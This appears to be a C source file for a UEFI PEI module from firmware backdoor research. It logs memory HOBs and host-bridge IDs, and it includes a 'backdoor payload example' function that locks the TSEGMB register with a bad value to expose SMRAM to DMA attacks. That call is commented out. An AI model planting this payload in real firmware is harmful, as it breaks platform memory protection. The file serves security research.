#include <PiPei.h>

#include <Library/PeimEntryPoint.h>
#include <Library/DebugLib.h>
#include <Library/HobLib.h>

#include <Ppi/CpuIo.h>
#include <Ppi/PciCfg.h>
#include <Ppi/MemoryDiscovered.h>

#include "config.h"
#include "payload.h"

#include "src/common.h"
#include "src/debug.h"

EFI_STATUS
MemoryDiscoveredCallback(
    EFI_PEI_SERVICES **ppPeiServices,
    EFI_PEI_NOTIFY_DESCRIPTOR *NotifyDescriptor,
    VOID *NullPpi
);

static EFI_PEI_NOTIFY_DESCRIPTOR m_MemoryDiscoveredNotify[] =
{
    {
        EFI_PEI_PPI_DESCRIPTOR_NOTIFY_CALLBACK | EFI_PEI_PPI_DESCRIPTOR_TERMINATE_LIST,
        &gEfiPeiMemoryDiscoveredPpiGuid,
        MemoryDiscoveredCallback
    }
};
//--------------------------------------------------------------------------------------
EFI_STATUS PrintHobInfo(EFI_PEI_SERVICES **ppPeiServices)
{
    EFI_PEI_HOB_POINTERS Hob;

    // get HOBs information
    EFI_STATUS Status = (*ppPeiServices)->GetHobList(ppPeiServices, &Hob.Raw);
    if (Status == EFI_SUCCESS) 
    {
        // print physical memory info
        while (!END_OF_HOB_LIST(Hob)) 
        {
            DbgMsg(__FILE__, __LINE__, "HOB: type = 0x%x\r\n", Hob.Header->HobType);

            if (Hob.Header->HobType == EFI_HOB_TYPE_RESOURCE_DESCRIPTOR &&
                Hob.ResourceDescriptor->ResourceType == EFI_RESOURCE_SYSTEM_MEMORY) 
            {
                DbgMsg(
                    __FILE__, __LINE__, 
                    " EFI_RESOURCE_SYSTEM_MEMORY: addr = "FPTR", size = "FPTR"\r\n",
                    Hob.ResourceDescriptor->PhysicalStart,
                    Hob.ResourceDescriptor->ResourceLength
                );
            }

            Hob.Raw = GET_NEXT_HOB(Hob);
        }
    }   
    else
    {
        DbgMsg(__FILE__, __LINE__, "GetHobList() ERROR 0x%x\r\n", Status);    
    } 

    return Status;
}
//--------------------------------------------------------------------------------------
EFI_STATUS TrashTSEGMB(VOID)
{
    // TSEGMB address (bus 0, device, 0, function 0, offset 0xB8)
    __outdword(0xcf8, PCI_ADDR(0, 0, 0, 0xb8));

    // write and lock TSEGMB with incorrect value
    __outdword(0xcfc, 0x00000001);

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS
MemoryDiscoveredCallback(
    EFI_PEI_SERVICES **ppPeiServices,
    EFI_PEI_NOTIFY_DESCRIPTOR *NotifyDescriptor,
    VOID *NullPpi)
{
    DbgMsg(__FILE__, __LINE__, "MemoryDiscoveredCallback() called!\r\n");

    PrintHobInfo(ppPeiServices);

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS Payload(
    EFI_PEI_FILE_HANDLE FileHandle, 
    CONST EFI_PEI_SERVICES **ppPeiServices)
{
    EFI_STATUS Status = EFI_SUCCESS;

    UINT32 val = 0;
    UINT16 vid = 0, did = 0;    

    if (ppPeiServices)
    {
        // install notify that will be called after the memory init
        if ((Status = (*ppPeiServices)->NotifyPpi(ppPeiServices, m_MemoryDiscoveredNotify)) != EFI_SUCCESS)
        {
            DbgMsg(__FILE__, __LINE__, "NotifyPpi() ERROR 0x%x\r\n", Status);
        }   
    }    

    // host bridge VID/PID address
    __outdword(0xcf8, PCI_ADDR(0, 0, 0, 0));

    val = __indword(0xcfc);

    vid = (UINT16)((val >> 0) & 0xffff),
    did = (UINT16)((val >> 16) & 0xffff);

    DbgMsg(__FILE__, __LINE__, "Host bridge VID:DID is %.4x:%.4x\n", vid, did);

    if (vid == 0x8086)
    {
        /* 
            Some useful stuff as backdoor payload example.

            Uncomment this function call to lock TSEGMB register with incorrect value,
            it will make SMRAM region vulnerable to software DMA attacks. You can
            read more details about such attacks in my "Breaking UEFI security with 
            software DMA attacks" article:

            http://blog.cr4.sh/2015/09/breaking-uefi-security-with-software.html
        */
        // TrashTSEGMB();
    }    

    return EFI_SUCCESS;   
}
//--------------------------------------------------------------------------------------
// EoF
